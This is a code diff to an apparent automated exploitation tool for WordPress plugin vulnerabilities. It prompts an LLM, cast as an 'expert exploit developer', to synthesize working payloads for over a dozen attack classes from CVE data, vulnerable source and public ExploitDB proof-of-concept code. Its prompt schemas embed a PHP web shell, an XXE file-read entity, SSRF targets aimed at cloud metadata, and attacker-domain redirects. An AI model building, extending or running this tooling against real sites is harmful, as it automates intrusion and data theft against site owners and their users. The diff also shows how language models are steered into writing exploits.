@@ -1507,15 +1507,288 @@ def _synthesize_exploit_from_intel(
     schema_hints: Optional[dict] = None,
     lang: str = "es",
 ) -> dict:
-    """LLM-driven exploit synthesis: given CVE intel + vulnerable source code, returns a
-    specific payload (not generic templates) with sql_context, bypass_needed, setup_steps."""
+    """LLM-driven exploit synthesis: class-aware. Returns specific payloads (not generic
+    templates) with class-specific fields + universal ok/bypass_needed/setup_steps/reasoning."""
     _cwe_map = {
         "CWE-89": "SQL Injection", "CWE-79": "XSS", "CWE-22": "Path Traversal",
         "CWE-98": "PHP File Inclusion", "CWE-918": "SSRF", "CWE-78": "OS Command Injection",
         "CWE-502": "Deserialization", "CWE-434": "Unrestricted File Upload",
         "CWE-352": "CSRF", "CWE-284": "IDOR", "CWE-269": "Privilege Escalation",
-        "CWE-94": "Code Injection", "CWE-611": "XXE",
+        "CWE-94": "Code Injection", "CWE-611": "XXE", "CWE-601": "Open Redirect",
+        "CWE-74": "Header Injection", "CWE-1336": "SSTI", "CWE-862": "Missing Auth",
     }
+    _vc = (vuln_class or "").lower().replace("_", "-")
+
+    # Per-class analysis instructions and response schema
+    _CLASS_SPECS: dict = {
+        "sqli": {
+            "analysis": (
+                "Analyze: (1) exact SQL context (numeric/quoted/ORDER BY), "
+                "(2) any sanitization to bypass (addslashes/intval/wpdb->prepare), "
+                "(3) boolean vs time vs error-based detection, (4) specific column/table targets."),
+            "schema": (
+                '  "payload": "<primary injection payload>",\n'
+                '  "true_payload": "<payload that makes condition TRUE>",\n'
+                '  "false_payload": "<payload that makes condition FALSE>",\n'
+                '  "sleep_payload": "<time-based payload with SLEEP(3)>",\n'
+                '  "sql_context": "numeric|single_quote|double_quote|order_by|between|json|unknown",\n'
+                '  "injection_type": "error_based|union|boolean_blind|time_based|direct",\n'
+                '  "expected_response_indicator": "<diff between true/false responses>",\n'
+            ),
+            "defaults": {"sql_context": "unknown", "injection_type": "unknown",
+                         "true_payload": "", "false_payload": "", "sleep_payload": ""},
+        },
+        "xss": {
+            "analysis": (
+                "Analyze: (1) injection context (HTML body / attribute / JS string / URL), "
+                "(2) which sanitizers/escaping functions are applied (esc_html/wp_kses/htmlspecialchars), "
+                "(3) reflected vs stored vs DOM, (4) exact event handler or tag needed to fire, "
+                "(5) CSP headers present, (6) how the value reaches the page output."),
+            "schema": (
+                '  "payload": "<XSS payload to inject>",\n'
+                '  "xss_context": "html_body|attribute|js_string|url|css|dom",\n'
+                '  "xss_type": "reflected|stored|dom",\n'
+                '  "event_handler": "<e.g. onerror, onmouseover, or empty if tag-based>",\n'
+                '  "encoding_bypass": "<URL-encode/double-encode/unicode/hex or none>",\n'
+                '  "trigger_condition": "<what admin action triggers execution>",\n'
+                '  "expected_response_indicator": "<alert fired / DOM node changed / cookie exfiltrated>",\n'
+            ),
+            "defaults": {"xss_context": "unknown", "xss_type": "reflected",
+                         "event_handler": "", "encoding_bypass": "none", "trigger_condition": ""},
+        },
+        "lfi": {
+            "analysis": (
+                "Analyze: (1) exact path construction in code, "
+                "(2) traversal depth needed (../../), "
+                "(3) PHP wrappers applicable (php://filter, php://input, data://), "
+                "(4) null-byte or encoding bypass needed, "
+                "(5) which file reveals useful data (/etc/passwd vs wp-config.php)."),
+            "schema": (
+                '  "payload": "<path traversal payload>",\n'
+                '  "traversal_depth": "<number of ../ needed>",\n'
+                '  "php_wrapper": "<php://filter/convert.base64-encode/resource=... or none>",\n'
+                '  "target_file": "<file to read that proves LFI>",\n'
+                '  "encoding_bypass": "<null-byte/%00/double-encode or none>",\n'
+                '  "expected_response_indicator": "<root:x: in response or base64 blob>",\n'
+            ),
+            "defaults": {"traversal_depth": "unknown", "php_wrapper": "none",
+                         "target_file": "/etc/passwd", "encoding_bypass": "none"},
+        },
+        "ssrf": {
+            "analysis": (
+                "Analyze: (1) which URL parameter is fetched, "
+                "(2) URL validation/blocklist applied, "
+                "(3) redirect-based bypass possibility, "
+                "(4) which internal services/metadata are reachable, "
+                "(5) response reflection (full/partial/blind)."),
+            "schema": (
+                '  "payload": "<SSRF payload URL>",\n'
+                '  "target_url": "<internal target e.g. http://169.254.169.254/latest/meta-data/>",\n'
+                '  "bypass_technique": "<@-notation/IPv6/decimal-IP/redirect or none>",\n'
+                '  "response_type": "full_reflection|partial|blind|time_based",\n'
+                '  "expected_response_indicator": "<AWS keys / internal HTML / response time>",\n'
+            ),
+            "defaults": {"target_url": "http://169.254.169.254/", "bypass_technique": "none",
+                         "response_type": "unknown"},
+        },
+        "idor": {
+            "analysis": (
+                "Analyze: (1) which object ID/parameter controls the resource, "
+                "(2) what authorization check is missing (capability_check/current_user_can), "
+                "(3) what data is exposed or action performed, "
+                "(4) which user role can trigger it (subscriber/author/contributor)."),
+            "schema": (
+                '  "payload": "<request with manipulated ID/parameter>",\n'
+                '  "object_param": "<name of the ID parameter>",\n'
+                '  "object_id_example": "<concrete ID value to test e.g. 1, admin, ../etc>",\n'
+                '  "missing_check": "<the exact capability or nonce check that is absent>",\n'
+                '  "exposed_data": "<what sensitive data/action is accessible>",\n'
+                '  "min_role": "unauthenticated|subscriber|contributor|author|editor",\n'
+                '  "expected_response_indicator": "<sensitive field in response>",\n'
+            ),
+            "defaults": {"object_param": "id", "object_id_example": "1",
+                         "missing_check": "unknown", "min_role": "subscriber"},
+        },
+        "file-upload": {
+            "analysis": (
+                "Analyze: (1) which MIME type / extension checks are applied, "
+                "(2) how to bypass (polyglot/double-extension/Content-Type spoof), "
+                "(3) where the file is stored and if it is web-accessible, "
+                "(4) minimal PHP shell that proves RCE via the upload."),
+            "schema": (
+                '  "payload": "<multipart/form-data body or curl command>",\n'
+                '  "bypass_technique": "<MIME-spoof/double-ext/null-byte/polyglot>",\n'
+                '  "shell_content": "<?php system($_GET[\'c\']); ?>",\n'
+                '  "upload_param": "<form field name for the file>",\n'
+                '  "stored_path": "<expected URL of uploaded file or unknown>",\n'
+                '  "expected_response_indicator": "<upload path in response / RCE output>",\n'
+            ),
+            "defaults": {"bypass_technique": "mime_spoof", "shell_content": "",
+                         "upload_param": "file", "stored_path": "unknown"},
+        },
+        "auth-bypass": {
+            "analysis": (
+                "Analyze: (1) which authentication gate is bypassable, "
+                "(2) exact bypass mechanism (parameter pollution / type juggling / magic value), "
+                "(3) what privileged action becomes accessible, "
+                "(4) any nonce or token that is improperly validated."),
+            "schema": (
+                '  "payload": "<request that bypasses auth>",\n'
+                '  "bypass_mechanism": "<type_juggling|param_pollution|magic_value|nonce_skip|other>",\n'
+                '  "bypass_param": "<parameter name that triggers bypass>",\n'
+                '  "bypass_value": "<exact value that bypasses the check>",\n'
+                '  "privileged_action": "<what becomes accessible after bypass>",\n'
+                '  "expected_response_indicator": "<admin panel / privileged data / 200 instead of 403>",\n'
+            ),
+            "defaults": {"bypass_mechanism": "unknown", "bypass_param": "",
+                         "bypass_value": "", "privileged_action": "unknown"},
+        },
+        "privesc": {
+            "analysis": (
+                "Analyze: (1) the role escalation path (from role X to role Y), "
+                "(2) which capability is improperly granted, "
+                "(3) the exact endpoint and parameter that triggers escalation, "
+                "(4) whether a nonce is required and how to obtain it."),
+            "schema": (
+                '  "payload": "<request to escalate privileges>",\n'
+                '  "from_role": "<attacker starting role>",\n'
+                '  "to_role": "<role gained after exploit>",\n'
+                '  "capability_abused": "<WordPress capability or REST permission>",\n'
+                '  "escalation_endpoint": "<exact endpoint / action>",\n'
+                '  "nonce_needed": true,\n'
+                '  "expected_response_indicator": "<role change confirmed / admin access>",\n'
+            ),
+            "defaults": {"from_role": "subscriber", "to_role": "administrator",
+                         "capability_abused": "unknown", "nonce_needed": False},
+        },
+        "rce": {
+            "analysis": (
+                "Analyze: (1) injection sink (eval/system/exec/shell_exec/popen/proc_open), "
+                "(2) how attacker input reaches the sink, "
+                "(3) OS command separator or PHP code needed, "
+                "(4) output reflection (direct/OOB/blind timing)."),
+            "schema": (
+                '  "payload": "<RCE payload>",\n'
+                '  "injection_sink": "<eval|system|exec|shell_exec|popen|proc_open|create_function>",\n'
+                '  "command": "<OS command or PHP code to execute>",\n'
+                '  "separator": "<; && | || ` $() or empty>",\n'
+                '  "output_type": "direct|oob|blind_timing|error_based",\n'
+                '  "expected_response_indicator": "<uid=0 / DNS callback / response delay>",\n'
+            ),
+            "defaults": {"injection_sink": "unknown", "command": "id",
+                         "separator": ";", "output_type": "direct"},
+        },
+        "csrf": {
+            "analysis": (
+                "Analyze: (1) which state-changing action lacks a valid nonce check, "
+                "(2) whether SameSite cookies block the attack, "
+                "(3) the minimal HTML form that triggers the action, "
+                "(4) what impact the state change has (create admin / change password / delete data)."),
+            "schema": (
+                '  "payload": "<HTML form or fetch() that triggers CSRF>",\n'
+                '  "missing_protection": "<nonce_missing|nonce_not_verified|samesite_missing>",\n'
+                '  "trigger_method": "<auto-submit form|img src|fetch GET|XHR POST>",\n'
+                '  "state_change": "<what happens when victim visits the page>",\n'
+                '  "victim_role_needed": "<admin|any authenticated user|any user>",\n'
+                '  "expected_response_indicator": "<admin created / setting changed / 200 OK>",\n'
+            ),
+            "defaults": {"missing_protection": "nonce_missing", "trigger_method": "auto-submit form",
+                         "state_change": "unknown", "victim_role_needed": "admin"},
+        },
+        "deserialization": {
+            "analysis": (
+                "Analyze: (1) which unserialize/json_decode/yaml_load function is called on user input, "
+                "(2) which PHP classes are in scope for a POP chain, "
+                "(3) the serialized object format needed, "
+                "(4) which magic methods (__wakeup/__destruct/__toString) are exploitable."),
+            "schema": (
+                '  "payload": "<serialized payload string>",\n'
+                '  "deserialization_function": "<unserialize|json_decode|yaml_load|pickle_loads>",\n'
+                '  "exploit_chain": "<class chain e.g. A::__destruct -> B::__call>",\n'
+                '  "magic_method": "<__wakeup|__destruct|__toString|__call>",\n'
+                '  "object_format": "<PHP_serialized|JSON|YAML|Python_pickle>",\n'
+                '  "expected_response_indicator": "<file created / RCE output / exception>",\n'
+            ),
+            "defaults": {"deserialization_function": "unserialize", "exploit_chain": "unknown",
+                         "magic_method": "__destruct", "object_format": "PHP_serialized"},
+        },
+        "ssti": {
+            "analysis": (
+                "Analyze: (1) which template engine is in use (Twig/Blade/Smarty/Latte), "
+                "(2) where user input is passed directly into template render, "
+                "(3) the sandbox escape technique specific to this engine, "
+                "(4) the payload that achieves RCE via the engine."),
+            "schema": (
+                '  "payload": "<SSTI payload>",\n'
+                '  "template_engine": "<Twig|Blade|Smarty|Latte|Mustache|plain_PHP>",\n'
+                '  "sandbox_escape": "<technique to break out of sandbox or none>",\n'
+                '  "rce_payload": "<payload to execute OS command>",\n'
+                '  "expected_response_indicator": "<PHP version / uid output / template error>",\n'
+            ),
+            "defaults": {"template_engine": "unknown", "sandbox_escape": "none", "rce_payload": ""},
+        },
+        "xxe": {
+            "analysis": (
+                "Analyze: (1) which XML parsing function is called on user input, "
+                "(2) whether external entities are enabled (libxml_disable_entity_loader), "
+                "(3) file read vs SSRF vs OOB exfiltration path, "
+                "(4) the exact DOCTYPE/ENTITY declaration needed."),
+            "schema": (
+                '  "payload": "<XML payload with malicious entity>",\n'
+                '  "entity_declaration": "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \\"file:///etc/passwd\\">]>",\n'
+                '  "attack_type": "file_read|ssrf|oob_exfil|dos",\n'
+                '  "xml_parser": "<SimpleXML|DOMDocument|XMLReader|simplexml_load_string>",\n'
+                '  "expected_response_indicator": "<root:x: in response / HTTP request to attacker server>",\n'
+            ),
+            "defaults": {"attack_type": "file_read", "xml_parser": "unknown", "entity_declaration": ""},
+        },
+        "open-redirect": {
+            "analysis": (
+                "Analyze: (1) where the redirect URL comes from (parameter/header/referrer), "
+                "(2) validation applied (startsWith check / allowlist / parse_url), "
+                "(3) bypass technique (protocol-relative // / @-notation / unicode), "
+                "(4) impact (phishing / OAuth token theft / CSP bypass)."),
+            "schema": (
+                '  "payload": "<redirect URL that bypasses validation>",\n'
+                '  "redirect_param": "<parameter name controlling redirect>",\n'
+                '  "bypass_technique": "<protocol_relative|at_notation|unicode|double_slash|none>",\n'
+                '  "attacker_domain": "<https://attacker.com>",\n'
+                '  "expected_response_indicator": "<Location: https://attacker.com in response>",\n'
+            ),
+            "defaults": {"redirect_param": "redirect_to", "bypass_technique": "none",
+                         "attacker_domain": "https://attacker.example.com"},
+        },
+    }
+
+    # Normalize vuln_class aliases
+    _vc_normalized = _vc
+    if _vc in ("sql-injection", "sqli"):
+        _vc_normalized = "sqli"
+    elif _vc in ("path-traversal", "lfi", "directory-traversal", "arbitrary-file-read"):
+        _vc_normalized = "lfi"
+    elif _vc in ("arbitrary-file-upload", "file-upload", "unrestricted-file-upload"):
+        _vc_normalized = "file-upload"
+    elif _vc in ("missing-authorization", "broken-access-control", "idor",
+                 "insecure-direct-object-reference"):
+        _vc_normalized = "idor"
+    elif _vc in ("privilege-escalation", "privesc", "broken-auth"):
+        _vc_normalized = "privesc"
+    elif _vc in ("auth-bypass", "authentication-bypass", "broken-authentication"):
+        _vc_normalized = "auth-bypass"
+    elif _vc in ("rce", "remote-code-execution", "code-injection", "command-injection",
+                 "os-command-injection"):
+        _vc_normalized = "rce"
+    elif _vc in ("server-side-template-injection", "template-injection"):
+        _vc_normalized = "ssti"
+    elif _vc in ("server-side-request-forgery"):
+        _vc_normalized = "ssrf"
+    elif _vc in ("cross-site-request-forgery"):
+        _vc_normalized = "csrf"
+    elif _vc in ("xml-external-entity", "xml-external-entity-injection"):
+        _vc_normalized = "xxe"
+
+    spec = _CLASS_SPECS.get(_vc_normalized, _CLASS_SPECS.get("sqli"))  # fallback to sqli spec
+
     cwes_str = ", ".join(
         f"{c} ({_cwe_map.get(c, c)})" for c in cve_intel.get("cwes", []))
     patch_summary = ""
@@ -1526,12 +1799,18 @@ def _synthesize_exploit_from_intel(
             f"- Vulnerable functions: {patch_diff.get('vuln_functions', [])}\n"
             f"- Fix type: {patch_diff.get('fix_type', '')}\n"
             f"- Diff snippet:\n{patch_diff.get('raw_diff_snippet', '')[:800]}")
-    schema_str = f"Database schema hints: {schema_hints}" if schema_hints else ""
+    _poc_code = (schema_hints or {}).get("public_poc_code", "")
+    schema_str = ""
+    if schema_hints:
+        _other_hints = {k: v for k, v in schema_hints.items() if k != "public_poc_code"}
+        if _other_hints:
+            schema_str = f"Database schema hints: {_other_hints}"
     system_prompt = (
         "You are an expert exploit developer specializing in WordPress plugin vulnerabilities. "
         "Synthesize precise, working exploit payloads from CVE intelligence and vulnerable "
-        "source code — not generic templates. Reason from actual code to understand exact "
-        "SQL context, injection point, and response behavior. Always respond in JSON only.")
+        "source code — not generic templates. Reason from actual code paths, not assumptions. "
+        f"This is a {_vc_normalized.upper()} vulnerability — apply class-specific analysis. "
+        "Always respond in JSON only.")
     user_prompt = (
         f"Synthesize a working exploit for this CVE.\n\n"
         f"CVE: {cve_intel.get('cve_id', '')}\n"
@@ -1539,40 +1818,35 @@ def _synthesize_exploit_from_intel(
         f"CVSS: {cve_intel.get('cvss_score', '?')}  "
         f"Attack vector: {cve_intel.get('attack_vector', '?')}\n\n"
         f"Official description:\n{cve_intel.get('description', 'N/A')[:800]}\n\n"
-        f"Security advisory (Wordfence/Patchstack):\n"
+        f"Security advisory (Wordfence/Patchstack/WPScan/MITRE):\n"
         f"{cve_intel.get('advisory_notes', 'N/A')[:1500]}\n\n"
         f"{patch_summary}\n\n"
-        f"Vulnerable code:\n```php\n{vulnerable_code[:2000] if vulnerable_code else 'N/A'}\n```\n\n"
-        f"Endpoint: {endpoint}\nVulnerable parameter: {param}\n{schema_str}\n\n"
-        "Analyze: (1) exact SQL/injection context, (2) any filters to bypass, "
-        "(3) expected response difference, (4) pre-conditions needed.\n\n"
+        f"Vulnerable code:\n```php\n{vulnerable_code[:2500] if vulnerable_code else 'N/A'}\n```\n\n"
+        + (f"Public PoC code (ExploitDB reference):\n```\n{_poc_code[:1500]}\n```\n\n"
+           if _poc_code else "")
+        + f"Endpoint: {endpoint}\nVulnerable parameter: {param}\n{schema_str}\n\n"
+        f"{spec['analysis']}\n\n"
         "Return ONLY valid JSON:\n"
         "{\n"
-        '  "payload": "<exact injection payload>",\n'
-        '  "true_payload": "<payload returning true/non-empty>",\n'
-        '  "false_payload": "<payload returning false/empty>",\n'
-        '  "sleep_payload": "<timing payload with SLEEP(3)>",\n'
-        '  "sql_context": "numeric|single_quote|double_quote|order_by|between|json|unknown",\n'
-        '  "injection_type": "error_based|union|boolean_blind|time_based|reflected|stored|direct",\n'
-        '  "expected_response_indicator": "<what to look for in response>",\n'
-        '  "bypass_needed": "<filter bypass technique, or none>",\n'
-        '  "setup_steps": ["<pre-condition>"],\n'
-        '  "reasoning": "<2-3 sentences why this payload works for this exact code>",\n'
+        f"{spec['schema']}"
+        '  "bypass_needed": "<filter/sanitizer bypass technique, or none>",\n'
+        '  "setup_steps": ["<pre-condition 1>", "<pre-condition 2>"],\n'
+        '  "reasoning": "<2-3 sentences: why this exact payload works for this specific code>",\n'
         '  "confidence": 0.0\n'
         "}")
     result: dict = {
-        "ok": False, "payload": "", "true_payload": "", "false_payload": "",
-        "sleep_payload": "", "sql_context": "unknown", "injection_type": "unknown",
-        "expected_response_indicator": "", "bypass_needed": "none",
+        "ok": False, "payload": "", "bypass_needed": "none",
         "setup_steps": [], "reasoning": "", "confidence": 0.0,
+        "vuln_class_used": _vc_normalized,
     }
+    result.update(spec.get("defaults", {}))
     try:
         import json as _j, re as _re2
         resp = llm.chat(
             system=system_prompt,
             messages=[{"role": "user", "content": user_prompt}],
             temperature=0.1,
-            max_tokens=1200,
+            max_tokens=1400,
         )
         raw = resp.content if hasattr(resp, "content") else str(resp)
         m = _re2.search(r'\{[\s\S]*\}', raw)
@@ -4697,34 +4971,124 @@ def _run_web_investigation(inv: "Investigation", lang: str, step, llm=None,
                                     with open(_fhit, errors="replace") as _fh_s:
                                         _vuln_code_synth = _fh_s.read()[:3000]
                                     break
+                    _cve_intel_synth = inv.llm_notes.get("cve_intel") or {"cve_id": cve_id,
+                                                                              "description": ""}
+                    # Inject any PoC snippets from ExploitDB into schema_hints so LLM can
+                    # see real public exploit code when reasoning about the payload
+                    _poc_snippets = _cve_intel_synth.get("poc_snippets", [])
+                    _schema_hints_synth: Optional[dict] = None
+                    if _poc_snippets:
+                        _schema_hints_synth = {
+                            "public_poc_code": "\n\n---\n\n".join(_poc_snippets[:2])[:2000]}
+                    # Pick the right param key depending on vuln class
+                    _param_synth = (
+                        notes.get("sqli_param") or notes.get("lfi_param") or
+                        notes.get("xss_param") or notes.get("ssrf_param") or
+                        notes.get("idor_param") or notes.get("upload_param") or
+                        notes.get("inject_param") or
+                        (list(notes.get("parameters", {}).keys() or [])[0]
+                         if isinstance(notes.get("parameters"), dict)
+                         and notes.get("parameters") else "") or ""
+                    )
                     _synth = _synthesize_exploit_from_intel(
                         llm=llm,
-                        cve_intel=inv.llm_notes.get("cve_intel") or {"cve_id": cve_id,
-                                                                      "description": ""},
+                        cve_intel=_cve_intel_synth,
                         vuln_class=vuln_class,
                         vulnerable_code=_vuln_code_synth,
                         endpoint=notes.get("endpoint", ""),
-                        param=(notes.get("sqli_param") or notes.get("lfi_param")
-                               or notes.get("xss_param") or ""),
+                        param=_param_synth,
                         patch_diff=inv.llm_notes.get("patch_diff_analysis"),
+                        schema_hints=_schema_hints_synth,
                         lang="es" if es else "en",
                     )
                     if _synth.get("ok") and _synth.get("confidence", 0) >= 0.5:
-                        step((f"síntesis de exploit: contexto={_synth['sql_context']}, "
-                              f"tipo={_synth['injection_type']}, "
-                              f"confianza={_synth['confidence']:.0%} — "
+                        _synth_vc = _synth.get("vuln_class_used", vuln_class)
+                        # Build a compact summary of the most relevant class-specific field
+                        _synth_detail = ""
+                        if _synth_vc == "sqli":
+                            _synth_detail = (f"ctx={_synth.get('sql_context','?')} "
+                                             f"type={_synth.get('injection_type','?')}")
+                        elif _synth_vc == "xss":
+                            _synth_detail = (f"ctx={_synth.get('xss_context','?')} "
+                                             f"type={_synth.get('xss_type','?')} "
+                                             f"event={_synth.get('event_handler','')}")
+                        elif _synth_vc == "lfi":
+                            _synth_detail = (f"depth={_synth.get('traversal_depth','?')} "
+                                             f"wrapper={_synth.get('php_wrapper','none')}")
+                        elif _synth_vc == "ssrf":
+                            _synth_detail = (f"target={_synth.get('target_url','?')} "
+                                             f"bypass={_synth.get('bypass_technique','none')}")
+                        elif _synth_vc == "idor":
+                            _synth_detail = (f"param={_synth.get('object_param','?')} "
+                                             f"missing={_synth.get('missing_check','?')}")
+                        elif _synth_vc == "file-upload":
+                            _synth_detail = f"bypass={_synth.get('bypass_technique','?')}"
+                        elif _synth_vc in ("auth-bypass", "privesc"):
+                            _synth_detail = (f"mech={_synth.get('bypass_mechanism') or _synth.get('capability_abused','?')}")
+                        elif _synth_vc == "rce":
+                            _synth_detail = (f"sink={_synth.get('injection_sink','?')} "
+                                             f"cmd={_synth.get('command','?')}")
+                        elif _synth_vc == "csrf":
+                            _synth_detail = f"trigger={_synth.get('trigger_method','?')}"
+                        elif _synth_vc == "ssti":
+                            _synth_detail = f"engine={_synth.get('template_engine','?')}"
+                        else:
+                            _synth_detail = f"type={_synth_vc}"
+                        step((f"síntesis [{_synth_vc}]: {_synth_detail}, "
+                              f"confianza={_synth.get('confidence',0):.0%} — "
                               f"{_synth.get('reasoning', '')[:180]}") if es else
-                             (f"exploit synthesis: context={_synth['sql_context']}, "
-                              f"type={_synth['injection_type']}, "
-                              f"confidence={_synth['confidence']:.0%} — "
+                             (f"synthesis [{_synth_vc}]: {_synth_detail}, "
+                              f"confidence={_synth.get('confidence',0):.0%} — "
                               f"{_synth.get('reasoning', '')[:180]}"))
                         inv.llm_notes["synthesized_exploit"] = _synth
+                        # Propagate class-specific hints to verifier notes
                         if _synth.get("sql_context") not in ("unknown", ""):
                             notes["sql_context_hint"] = _synth["sql_context"]
+                        if _synth.get("xss_context") not in ("unknown", "", None):
+                            notes["xss_context_hint"] = _synth["xss_context"]
+                        if _synth.get("xss_type"):
+                            notes["xss_type_hint"] = _synth["xss_type"]
+                        if _synth.get("event_handler"):
+                            notes["xss_event_handler"] = _synth["event_handler"]
+                        if _synth.get("encoding_bypass") not in ("none", "", None):
+                            notes["encoding_bypass"] = _synth["encoding_bypass"]
+                        if _synth.get("traversal_depth") not in ("unknown", "", None):
+                            notes["lfi_traversal_depth"] = _synth["traversal_depth"]
+                        if _synth.get("php_wrapper") not in ("none", "", None):
+                            notes["lfi_php_wrapper"] = _synth["php_wrapper"]
+                        if _synth.get("target_url"):
+                            notes["ssrf_target_url"] = _synth["target_url"]
+                        if _synth.get("bypass_technique") not in ("none", "", None):
+                            notes["ssrf_bypass_technique"] = _synth["bypass_technique"]
+                        if _synth.get("object_param"):
+                            notes["idor_object_param"] = _synth["object_param"]
+                        if _synth.get("missing_check"):
+                            notes["idor_missing_check"] = _synth["missing_check"]
+                        if _synth.get("bypass_mechanism") not in ("unknown", "", None):
+                            notes["auth_bypass_mechanism"] = _synth["bypass_mechanism"]
+                        if _synth.get("bypass_value"):
+                            notes["auth_bypass_value"] = _synth["bypass_value"]
+                        if _synth.get("from_role"):
+                            notes["privesc_from_role"] = _synth["from_role"]
+                        if _synth.get("capability_abused"):
+                            notes["privesc_capability"] = _synth["capability_abused"]
+                        if _synth.get("injection_sink"):
+                            notes["rce_sink"] = _synth["injection_sink"]
+                        if _synth.get("template_engine") not in ("unknown", "", None):
+                            notes["ssti_engine"] = _synth["template_engine"]
+                        if _synth.get("entity_declaration"):
+                            notes["xxe_entity"] = _synth["entity_declaration"]
+                        if _synth.get("redirect_param"):
+                            notes["redirect_param"] = _synth["redirect_param"]
+                        # Universal hints
                         if _synth.get("setup_steps"):
                             notes["exploit_setup_steps"] = _synth["setup_steps"]
                         if _synth.get("bypass_needed") not in ("none", "", None):
                             notes["bypass_needed"] = _synth["bypass_needed"]
+                        if _synth.get("expected_response_indicator"):
+                            notes["synth_response_indicator"] = _synth["expected_response_indicator"]
+                        if _synth.get("payload"):
+                            notes["synthesized_payload"] = _synth["payload"]
                 except Exception:
                     pass
             # Override determinista para WordPress SQLi: si un parametro de tipo DataTables
